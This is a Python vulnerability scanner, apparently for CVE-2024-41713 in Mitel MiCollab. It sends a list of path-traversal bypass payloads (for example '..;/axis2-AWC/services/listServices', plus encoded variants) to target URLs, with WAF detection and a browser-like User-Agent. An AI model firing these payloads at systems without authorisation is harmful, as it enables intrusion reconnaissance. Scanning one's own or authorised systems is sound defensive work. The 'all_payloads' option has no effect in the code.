#!/usr/bin/env python3
"""
CVE-2024-41713 Scanner - Core Module
Shared scanning functionality for CLI and Web App.
"""

import hashlib
import re
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Version
__version__ = "2.1.0"


@dataclass
class ScanResult:
    """Represents the result of a vulnerability scan."""
    target: str
    vulnerable: bool
    payload: Optional[str] = None
    status_code: Optional[int] = None
    response_length: Optional[int] = None
    response_snippet: Optional[str] = None
    response_time: Optional[float] = None
    server_header: Optional[str] = None
    waf_detected: Optional[str] = None
    error: Optional[str] = None
    timestamp: str = ""
    request_hash: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()
        if not self.request_hash:
            self.request_hash = hashlib.md5(f"{self.target}{self.timestamp}".encode()).hexdigest()[:8]


@dataclass
class ScanConfig:
    """Configuration for the scanner."""
    timeout: int = 10
    verify_ssl: bool = True
    user_agent: str = None
    all_payloads: bool = False
    verbose: bool = False
    proxy: str = None
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    rate_limit: float = 0
    retries: int = 3
    follow_redirects: bool = False
    method: str = "GET"
    match_regex: str = None
    exclude_regex: str = None


# Multiple payloads to test various bypass techniques
PAYLOADS = [
    "/npm-pwg/..;/axis2-AWC/services/listServices",
    "/npm-pwg/..;/axis2-AWC/services",
    "/npm-pwg/..;/axis2/services/listServices",
    "/npm-pwg/..%3B/axis2-AWC/services/listServices",
    "/npm-pwg/%2e%2e;/axis2-AWC/services/listServices",
    "/npm-pwg/..;/..;/axis2-AWC/services/listServices",
]

# Indicators that suggest vulnerability
VULNERABILITY_INDICATORS = [
    "<ServiceList>",
    "<service>",
    "axis2",
    "listServices",
    "<wsdl:",
    "xmlns:axis2",
]

# WAF signatures for detection
WAF_SIGNATURES = {
    "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
    "AWS WAF": ["awswaf", "x-amzn-waf"],
    "Akamai": ["akamai", "x-akamai"],
    "Imperva": ["incapsula", "x-iinfo", "visid_incap"],
    "F5 BIG-IP": ["x-wa-info", "bigip", "f5"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Fortinet": ["fortigate", "fortiwaf"],
    "Barracuda": ["barracuda", "barra_counter"],
    "Sucuri": ["sucuri", "x-sucuri"],
    "Wordfence": ["wordfence"],
}

# Common server fingerprints
SERVER_FINGERPRINTS = {
    "mitel": "Mitel MiCollab/MiVoice",
    "apache": "Apache HTTP Server",
    "nginx": "Nginx",
    "iis": "Microsoft IIS",
    "tomcat": "Apache Tomcat",
}


def detect_waf(headers: dict, body: str) -> Optional[str]:
    """Detect if a WAF is present based on response headers and body."""
    combined = str(headers).lower() + body.lower()
    for waf_name, signatures in WAF_SIGNATURES.items():
        for sig in signatures:
            if sig.lower() in combined:
                return waf_name
    return None


def detect_server(headers: dict) -> Optional[str]:
    """Detect server type from headers."""
    server = headers.get("Server", "").lower()
    for fingerprint, name in SERVER_FINGERPRINTS.items():
        if fingerprint in server:
            return name
    return headers.get("Server") or "Unknown"


def create_session(config: ScanConfig) -> requests.Session:
    """Create a requests session with retry logic and configuration."""
    session = requests.Session()
    
    # Configure retries
    retry_strategy = Retry(
        total=config.retries,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST", "HEAD"],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    # Configure proxy
    if config.proxy:
        session.proxies = {
            "http": config.proxy,
            "https": config.proxy,
        }
    
    # Configure cookies
    if config.cookies:
        session.cookies.update(config.cookies)
    
    return session


def scan_target(
    target_url: str,
    config: ScanConfig = None,
    session: requests.Session = None,
    custom_payloads: list = None,
) -> ScanResult:
    """
    Scan a target URL for CVE-2024-41713 vulnerability.
    
    Args:
        target_url: The target URL to scan
        config: ScanConfig object with all settings
        session: Optional requests session to use
        custom_payloads: Optional list of custom payloads
    
    Returns:
        ScanResult object with scan results
    """
    if config is None:
        config = ScanConfig()
    
    target_url = target_url.strip().rstrip("/")
    
    # Ensure URL has a scheme
    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": config.user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Connection": "close",
    }
    
    # Add custom headers
    headers.update(config.headers)
    
    # Use provided session or create a new one
    if session is None:
        session = create_session(config)
    
    # Use custom payloads or defaults
    payloads_to_test = custom_payloads if custom_payloads else PAYLOADS
    
    waf_detected = None
    server_header = None

    for payload in payloads_to_test:
        test_url = target_url + payload
        
        # Rate limiting
        if config.rate_limit > 0:
            time.sleep(config.rate_limit)
        
        try:
            start_time = time.time()
            
            # Choose HTTP method
            if config.method.upper() == "POST":
                response = session.post(
                    test_url,
                    headers=headers,
                    timeout=config.timeout,
                    verify=config.verify_ssl,
                    allow_redirects=config.follow_redirects,
                )
            elif config.method.upper() == "HEAD":
                response = session.head(
                    test_url,
                    headers=headers,
                    timeout=config.timeout,
                    verify=config.verify_ssl,
                    allow_redirects=config.follow_redirects,
                )
            else:
                response = session.get(
                    test_url,
                    headers=headers,
                    timeout=config.timeout,
                    verify=config.verify_ssl,
                    allow_redirects=config.follow_redirects,
                )
            
            response_time = time.time() - start_time
            
            # Detect WAF and server
            if waf_detected is None:
                waf_detected = detect_waf(dict(response.headers), response.text)
            if server_header is None:
                server_header = detect_server(dict(response.headers))
            
            # Check for vulnerability indicators
            is_vulnerable = False
            if response.status_code == 200:
                response_text = response.text
                
                # Custom regex matching
                if config.match_regex:
                    if re.search(config.match_regex, response_text, re.IGNORECASE):
                        is_vulnerable = True
                elif config.exclude_regex:
                    if not re.search(config.exclude_regex, response_text, re.IGNORECASE):
                        is_vulnerable = True
                else:
                    # Default indicator check
                    response_lower = response_text.lower()
                    for indicator in VULNERABILITY_INDICATORS:
                        if indicator.lower() in response_lower:
                            is_vulnerable = True
                            break
            
            if is_vulnerable:
                return ScanResult(
                    target=target_url,
                    vulnerable=True,
                    payload=payload,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    response_snippet=response.text[:500],
                    response_time=response_time,
                    server_header=server_header,
                    waf_detected=waf_detected,
                )
            
            if not config.all_payloads:
                continue
                
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.SSLError as e:
            return ScanResult(
                target=target_url, 
                vulnerable=False, 
                error=f"SSL Error: {e}",
                server_header=server_header,
                waf_detected=waf_detected,
            )
        except requests.exceptions.ProxyError as e:
            return ScanResult(target=target_url, vulnerable=False, error=f"Proxy Error: {e}")
        except requests.exceptions.RequestException as e:
            return ScanResult(
                target=target_url, 
                vulnerable=False, 
                error=str(e),
                server_header=server_header,
                waf_detected=waf_detected,
            )

    return ScanResult(
        target=target_url, 
        vulnerable=False,
        server_header=server_header,
        waf_detected=waf_detected,
    )
